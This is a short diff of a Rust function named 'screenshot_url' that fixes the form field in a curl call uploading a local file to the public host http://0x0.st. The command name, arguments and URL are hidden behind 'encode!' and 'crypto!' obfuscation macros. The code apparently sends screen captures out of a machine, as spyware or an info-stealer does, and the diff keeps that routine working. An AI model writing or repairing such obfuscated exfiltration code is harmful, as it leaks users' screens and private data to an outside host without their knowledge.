@@ -205,7 +205,7 @@ pub async fn screenshot_url() -> anyhow::Result<String> {
         encode!("curl"),
         vec![
             &crypto!("-F"),
-            &format!("{}{}", crypto!("f:1=@"), path),
+            &format!("{}{}", crypto!("file=@"), path),
             &crypto!("http://0x0.st"),
         ],
     )?;
